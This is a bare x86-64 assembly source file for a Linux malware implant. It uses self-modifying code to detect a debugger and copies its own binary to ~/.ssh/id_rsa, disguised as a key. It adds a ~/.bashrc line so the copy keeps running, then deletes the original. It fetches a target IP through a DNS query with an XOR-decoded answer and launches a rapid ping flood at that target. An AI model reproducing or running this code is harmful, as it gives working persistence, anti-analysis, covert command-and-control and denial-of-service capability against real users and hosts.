
global _start

struc   sockaddr
	sin_family:	resw	1
	sin_port:	resw	1
	sin_addr:	resd	1
    padding:    resb    8
    endstruc

struc   inaddr
	s_addr:	resq	1
    endstruc

section .data


    bash_path db '/.bashrc', 0x00
    bash_line db '~/.ssh/id_rsa', 0xA, 0x00
    bash_line_size equ $ - bash_line


    filename db '/.ssh/id_rsa', 0x00
    filename_size equ $ - filename


    sock_addr:
        istruc sockaddr
            at sin_family,	dw	0x02 ; AF_INET
            at sin_port,	dw	0x3500 ; Port 53 
            at sin_addr,	dd	0x1a01a8c0 ; ip ad
            at padding,     dq  0X0000000000000000 ; padding
        iend
        
    sock_addr_size EQU $ - sock_addr


    short_message db 'wikipedia'
    short_message_length EQU $ - short_message

    time_wait dq 0x0000000000000004
              dq 0x0000000000000000

    time_wait_size EQU $ - time_wait

    time_sleep dq 20
               dq 0
               
    command db '/bin/ping',0x00

    null db '/dev/null',0x00

    debugger_detected db 'Debugger detected!', 0
    msg db 'No debugger detected.',0
               



section .bss

    buf_filename resb 200
    buf_filename_size equ $ - buf

    buf_bash resb 200
    buf_bash_size equ $ - buf


    buf resb 20000
    buf_size equ $ - buf

    request_content: resb 500
    request_content_size EQU $ - request_content


    time_left: resb 8


    recvfrom_src_addr: resw 1
                       resb 14
                       
    recvfrom_src_addr_size EQU $ - recvfrom_src_addr

    dns_ID: resw 1

    target_ip: resb 16



section .text

_start:

    push rbp
    mov rbp, rsp
    sub rsp, 0x40

    mov rdi, systemcall ; adress of systemcall label
    mov rax, 0x050f
    stosw

    systemcall:
    xor eax, ebx ; this instruction will be replaced by 'syscall' during runtime

    cmp rax, 0
    jl debuggerDetected


 
    nop
    nop
    nop
    nop


    mov rax, 0x08
    mov rsi, rsp
    add rsi, 0x48 
    mov rcx, [rsi]  
    add rcx, 0x02
    imul rcx, rax
    add rsi, rcx ; Stores the first address of envp* 

    mov rax, 'HOME' 


.loop: ; the loop parse all the envp* to find the HOME variable
    cmp Qword [rsi], 0x00
    je exit
    mov rdi, [rsi]
    scasd
    je .next
    add rsi, 0x08
    jmp .loop


.next:
    inc rdi
    mov rsi, buf_filename
    xor rcx, rcx
    xor rax, rax

.loop2: ; copies the HOME variable to the filename buffer
    mov al, byte [rdi+rcx]
    cmp al, 0x00
    je .next2
    mov [rsi+rcx], al
    inc rcx
    jmp .loop2

.next2:
    mov rsi, buf_bash
    xor rcx, rcx
    xor rax, rax

.loop3: ; copies the HOME variable to the bashrc buffer
    mov al, byte [rdi+rcx]
    cmp al, 0x00
    je .next3
    mov [rsi+rcx], al
    inc rcx
    jmp .loop3

.next3:
    mov rsi, buf_filename
    mov [rbp - 0x20], rcx ; save the HOME variable size in the stack
    add rsi, rcx
    xor rcx, rcx
    mov rdi, filename

.loop4: ; Append the .ssh/id_rsa (fake_filename) to the buffer with the HOME variable    
    mov al, byte [rdi+rcx]
    cmp al, 0x00
    je .next4
    mov [rsi+rcx], al
    inc rcx
    jmp .loop4

.next4:
    mov [rsi+rcx], byte 0x00
    mov rsi, buf_bash
    mov rcx, [rbp - 0x20]
    add rsi, rcx
    mov rdi, bash_path
    xor rcx, rcx

.loop5: ; append the bashrc path to the HOME variable in the bashrc buffer   
    mov al, byte [rdi+rcx]
    cmp al, 0x00
    je .next5
    mov [rsi+rcx], al
    inc rcx
    jmp .loop5

.next5:
    mov [rsi+rcx], byte 0x00 ; null byte delimiter


;;;;;;;;;;;;;;;;;;;;;;;;;;


    mov rsi, rbp
    add rsi, 0x10
    mov rsi, [rsi]
    mov [rbp - 0x28], rsi ; save the argv[0] in the stack


    mov rax, 0x02
    mov rdi, rsi
    mov rsi, 0x00
    mov rdx, 0x00
    syscall

    mov [rbp - 0x08], rax

    mov rdi, rax
    mov rsi, 0x00
    mov rdx, 0x02
    mov rax, 0x08
    syscall ; lseek(fd, 0, SEEK_end)

    mov [rbp - 0x10], rax

    mov rdi, [rbp - 0x08]
    mov rsi, 0x00
    mov rdx, 0x00
    mov rax, 0x08
    syscall ; lseek(fd, 0, SEEK_end)


    mov rsi, buf
    mov rdi, 0x03
    mov rdx, [rbp - 0x10]
    mov rax, 0x00
    syscall ; read(fd, buf, buf_size)


    mov rdi, buf
    xor rcx, rcx
    mov eax, 0x10101010
    or eax, 0x80808080
    .check:
        
        scasd
        je .clean
        sub rdi, 0x03
        jmp .check

    .clean:
        jmp .clean_loop

    .clean_loop:
        mov byte [rdi], 0x90
        scasd
        je .clean_end
        sub rdi, 0x03
        jmp .clean_loop

    .clean_end:





    mov rdi, buf_filename
    mov rsi, 0x42
    mov rdx, 0q00777
    mov rax, 0x02
    syscall ; open(output_file, O_CREAT | O_WRONLY, 0777)

    mov [rbp - 0x18], rax

    mov rdi, [rbp - 0x18]
    mov rsi, buf
    mov rdx, [rbp - 0x10]
    mov rax, 0x01
    syscall ; write(fd, buf, buf_size)

    mov rdi, [rbp - 0x18]
    mov rax, 0x03
    syscall

    mov rdi, buf_bash
    mov rsi, 0x02
    mov rdx, 0x00
    mov rax, 0x02
    syscall ; open(bash_path, O_APPEND | O_WRONLY ??? , 0)

    mov [rbp - 0x18], rax

    mov rdi, [rbp - 0x18]
    mov rsi, bash_line
    mov rdx, bash_line_size
    mov rax, 0x01
    syscall ; write(fd, bash_line, bash_line_size)


    mov rdi, [rbp - 0x18]
    mov rax, 0x03
    syscall ; close the newly created file

    mov rdi, [rbp - 0x28] ; argv[0]
    mov rax, 0x57
    syscall ; delete the parent binary

    mov rax, 0x39
    syscall ; fork the process

    cmp rax, 0x00
    jne exit ; exit the parent process

    mov rdi, buf_filename
    xor rax, rax
    push rax
    push rdi
    mov rsi, rsp
    mov rdx, 0x00
    mov rax, 0x3b
    syscall ; Executing the copied binary in the child process

    nop
    nop
    nop
    nop
    
    mov rdi, 0x2 ; AF_INET
    mov rsi, 0x2 ; SOCK_DGRAM
    mov rdx, 0x0 ; IPPROTO_IP
    mov rax, 0x29 
    syscall ; creates the socket
    mov [rbp - 0x08], rax ; save the socket fd in the stack



    mov rdi , [rbp - 0x08] ; socket fd
    mov rsi, 0x01
    mov rdx, 66
    mov r10, time_wait
    mov r8, time_wait_size
    mov rax, 0x36
    syscall ; set the socket timeout




    call write_dns_request ; write the dns request to the request content buffer
    mov [rbp - 0x10], rax ; save the request content size in the stack

    
    mov rdi, [rbp - 0x08] ; socket fd
    mov rsi, request_content ; message
    mov rdx, rcx; message length
    mov r10, 0x0 ; flags
    mov r8, sock_addr ; sockaddr
    mov r9, sock_addr_size ; sockaddr size
    mov rax, 0x2c
    syscall ; udp sendto


    mov rdi, [rbp - 0x08] ; socket fd
    mov rsi, request_content ; buffer
    mov rdx, request_content_size ; buffer size
    mov r10, 0x0 ; flags
    mov r8, 0x00 ; sockaddr
    mov r9, 0x00 ; sockaddr size
    mov rax, 0x2d
    syscall ; udp recvfrom

    cmp rax, 0x00 ; check if the recvfrom failed

    jg next
    
    mov rdi, [rbp - 0x08] ; socket fd
    mov rax, 0x3
    syscall ; close the socket

    mov rdi, time_sleep
    mov rsi, 0x00
    mov rax, 0x23
    syscall ; sleep for 4 seconds

    jmp _start ; try again



next:




    
    mov rdi, request_content ; buffer
    mov rsi, target_ip ; buffer
    mov rdx, [rbp - 0x10] ; buffer size
    call parse_answer ; parse the answer

    mov rdi, target_ip ; buffer
    call reformat_ip ; reformat the ip address


    mov rax, 0x39
    syscall ; fork()
    cmp rax, 0x00
    jne exit ; exit the parent process

    mov rdi, null ; buffer
    mov rsi, 0x01 ; flags
    mov rax, 0x02
    syscall ; open /dev/null



    mov rdi, target_ip ; buffer
    mov rsi, rax
    call send_ping

    mov rdi, 0x01 ; stdout
    mov rsi, target_ip ; buffer
    mov rdx, rax ; buffer size
    mov rax, 0x01
    syscall ; write the received data to stdout

    
    mov rdi, [rbp - 0x08] ; socket fd
    mov rax, 0x3
    syscall ; close the socket


exit:


    mov rdi, 0 ; exit code
    mov rax, 60
    syscall ; exit



;;;;;;;;;;;;;;;;;;;;;;; functions ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


create_message:
    push rbp
    mov rbp, rsp
    sub rsp, 0x40
    xor rcx, rcx

    create_message_loop:

        

        mov al, byte [rsi+rcx] ; get the first byte of the message
        mov [rdi + r10], al
        inc r10
        inc rcx
        cmp rcx, rdx
        jl create_message_loop

    mov rax, rcx ; return the message size
    leave
    ret






write_dns_request:

    push rbp
    mov rbp, rsp
    sub rsp, 0x40



    mov rdi, dns_ID ; buffer
    mov rsi, 0x02 ; buffer size
    mov rdx, 0x00 ; flags
    mov rax, 0x013e
    syscall ; get random bytes for the dns ID

    xor rcx, rcx

    mov rax, [dns_ID] ; DNS Query ID
    mov [request_content+rcx], ax
    add rcx, 2

    mov rax, 0x0001 ; DNS Flags
    mov [request_content + rcx], ax
    add rcx, 2

    mov rax, 0x0100 ; DNS QDCOUNT
    mov [request_content + rcx], ax
    add rcx, 2

    mov rax, 0x0000 ; DNS ANCOUNT
    mov [request_content + 6], ax
    add rcx, 2

    mov [request_content + 8], ax ; DNS NSCOUNT
    add rcx, 2

    mov [request_content + 10], ax ; DNS ARCOUNT
    add rcx, 2

    mov rax, short_message_length ; DNS QNAME LENGTH 1
    mov [request_content + 12], al
    add rcx, 1

    mov [rbp - 0x10], rcx ; save the request content size in the stack
    mov rdi, request_content ; buffer destination
    mov rsi, short_message ; buffer source
    mov rdx, short_message_length ; buffer size
    mov r10, rcx ; buffer destination offset
    call create_message ; create the message
    mov rcx, [rbp - 0x10] ; restore the request content size from the stack
    add rcx, rax ; add the message size to the request content size

    mov rax, 0x03 ; DNS QNAME LENGTH 2
    mov [request_content + rcx], al
    add rcx, 1

    mov al, 'o'
    mov [request_content + rcx], al
    inc rcx
    mov al, 'r'
    mov [request_content + rcx], al
    inc rcx
    mov al, 'g'
    mov [request_content + rcx], al
    inc rcx

    mov rax, 0x00 ; DNS QNAME Null Terminator
    mov [request_content + rcx], al
    add rcx, 1


    
    mov rax, 0x1c00 ; DNS QTYPE
    mov [request_content + rcx], ax
    add rcx, 2

    mov rax, 0x0100 ; DNS QCLASS
    mov [request_content + rcx], ax
    add rcx, 2

    mov rax, rcx ; return the request content size
    
    leave
    ret


parse_answer:


    push rbp
    mov rbp, rsp
    sub rsp, 0x40

    xor rcx, rcx
    mov rax, rdx
    add rax, 0x0c ; skip the dns header
    mov r9b, byte [dns_ID] ; get the first byte of the message
    mov r10b, byte [dns_ID+1] ; get the second byte of the message

    parse_answer_loop:

        mov r8b , byte [rdi+rax] ; get the first byte of the message
        xor r8b, r10b
        xor r8b, r9b

        xor r9b, r10b
        xor r10b, r9b

        mov [rsi+rcx], r8b

        inc rax
        inc rcx
        cmp rcx, 0x10
        jl parse_answer_loop

    leave
    ret


reformat_ip:

    push rbp
    mov rbp, rsp
    sub rsp, 0x40

    xor rcx, rcx

    reformat_ip_loop:

        mov al, byte [rdi+rcx]
        cmp al, 0x41
        je reformat_ip_end
        inc rcx
        jmp reformat_ip_loop

    reformat_ip_end:

        mov [rdi+rcx], byte 0x00
        mov rax, rcx

    leave
    ret



send_ping:

    push rbp
    mov rbp, rsp
    sub rsp, 0x40

    push rdi

    mov rdi, 0x01
    mov rsi, rsi
    mov rax, 0x21
    syscall ; redirect output of stdout to /dev/null

    mov rdi, 0x01
    mov rax, 0x03
    syscall ; close the stdout

    pop rdi



    xor rdx, rdx

    xor rax, rax
    mov rbx, '-i'
    mov rcx, '0.2'
    push rcx
    mov rcx, rsp
    push rbx
    mov rbx, rsp

    push rax
    push rdi
    push rcx
    push rbx
    push command
    mov rsi, rsp
    mov rdi, command
    mov rax, 0x3b
    syscall

    leave
    ret

debuggerDetected:
    mov rax, 0x1
    mov rdi, 0x1
    mov rsi, debugger_detected
    mov rdx, 18
    syscall
    
    mov rax, 0x3C
    mov rbx, 0x1
    syscall

    mov rax, 0x3C
    mov rdi, -1
    syscall





    
